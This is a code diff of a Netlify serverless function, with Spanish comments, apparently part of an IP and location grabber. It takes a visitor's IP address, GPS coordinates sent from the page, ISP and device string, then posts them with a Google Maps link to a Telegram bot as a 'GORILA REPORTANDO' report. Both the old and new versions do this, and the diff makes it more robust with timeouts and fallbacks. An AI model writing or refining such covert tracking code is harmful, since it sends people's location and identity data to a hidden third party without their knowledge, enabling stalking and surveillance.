@@ -1,59 +1,58 @@
 const axios = require('axios');
 
 exports.handler = async (event) => {
-    const clientIP = event.headers['x-nf-client-connection-ip'] || event.headers['client-ip'];
-    const userAgent = event.headers['user-agent'];
-    const referrer = event.headers['referer'] || 'Clic directo / Enlace pegado';
+    // Definir IPs y datos básicos
+    const clientIP = event.headers['x-nf-client-connection-ip'] || event.headers['client-ip'] || "127.0.0.1";
+    const userAgent = event.headers['user-agent'] || "Desconocido";
 
     try {
-        // Parsear los datos que vienen del index.html
-        const bodyData = JSON.parse(event.body || "{}");
-
-        // 1. Obtener datos base de la IP e ISP
-        const ipInfo = await axios.get(`http://ip-api.com/json/${clientIP}?fields=status,country,regionName,city,isp,lat,lon`);
-        const data = ipInfo.data;
-
-        let reporteUbicacion = "";
-        let googleMapsApp = "";
-
-        // 2. Lógica de Ubicación (GPS vs IP)
-        if (bodyData.lat && bodyData.lon) {
-            reporteUbicacion = "🎯 PRECISA (GPS)";
-            googleMapsApp = `https://www.google.com/maps?q=${bodyData.lat},${bodyData.lon}`;
-        } else {
-            // Respaldo por IP si el GPS falla
-            const city = data.city || "Desconocida";
-            const country = data.country || "Desconocido";
-            reporteUbicacion = `☁️ APROXIMADA (IP) - ${city}, ${country}`;
-            googleMapsApp = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
+        // Parsear el body con seguridad
+        let bodyData = {};
+        if (event.body) {
+            try { bodyData = JSON.parse(event.body); } catch (e) { bodyData = {}; }
         }
 
-        // 3. Limpiar el User Agent para mostrar el modelo (si es posible)
-        const dispositivoSimple = userAgent.split('(')[1] ? userAgent.split('(')[1].split(')')[0] : "Desconocido";
+        // Consultar IP-API (con timeout para que no se cuelgue Netlify)
+        let ipData = {};
+        try {
+            const res = await axios.get(`http://ip-api.com/json/${clientIP}`, { timeout: 2000 });
+            ipData = res.data;
+        } catch (e) { ipData = {}; }
 
-        // --- ESTRUCTURA DEL MENSAJE GORILA ---
+        // Configurar coordenadas (GPS o IP)
+        const lat = bodyData.lat || ipData.lat || 0;
+        const lon = bodyData.lon || ipData.lon || 0;
+        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+        // Construir mensaje
         let mensaje = `🦍 *¡GORILA REPORTANDO!* 🦍\n\n`;
         mensaje += `🔑 *IP:* \`${clientIP}\`\n`;
-        mensaje += `📍 *Ubicación:* ${reporteUbicacion}\n`;
-        mensaje += `📡 *ISP:* ${data.isp}\n`;
-        mensaje += `📱 *Sistema:* ${dispositivoSimple}\n`;
-        mensaje += `🔗 *Origen:* ${referrer}\n`;
-        mensaje += `🗺️ *Mapa:* [Ver Ubicación](${googleMapsApp})`;
+        mensaje += `📍 *Ubicación:* ${bodyData.lat ? '🎯 GPS' : '☁️ IP'}\n`;
+        mensaje += `📡 *ISP:* ${ipData.isp || 'Desconocido'}\n`;
+        mensaje += `📱 *Dispositivo:* ${userAgent.substring(0, 50)}...\n\n`;
+        mensaje += `🗺️ [VER EN GOOGLE MAPS](${mapsUrl})`;
 
+        // Enviar a Telegram
         const token = process.env.TELEGRAM_TOKEN;
         const chatId = process.env.TELEGRAM_CHAT_ID;
 
         await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
             chat_id: chatId,
             text: mensaje,
-            parse_mode: 'Markdown',
-            disable_web_page_preview: false
+            parse_mode: 'Markdown'
         });
 
-        return { statusCode: 200, body: "OK" };
+        return { 
+            statusCode: 200, 
+            headers: { "Access-Control-Allow-Origin": "*" },
+            body: "Reporte enviado" 
+        };
 
     } catch (error) {
-        console.error("Error en el logger:", error);
-        return { statusCode: 500, body: "Error" };
+        console.error("Error crítico:", error.message);
+        return { 
+            statusCode: 500, 
+            body: "Error interno: " + error.message 
+        };
     }
 };
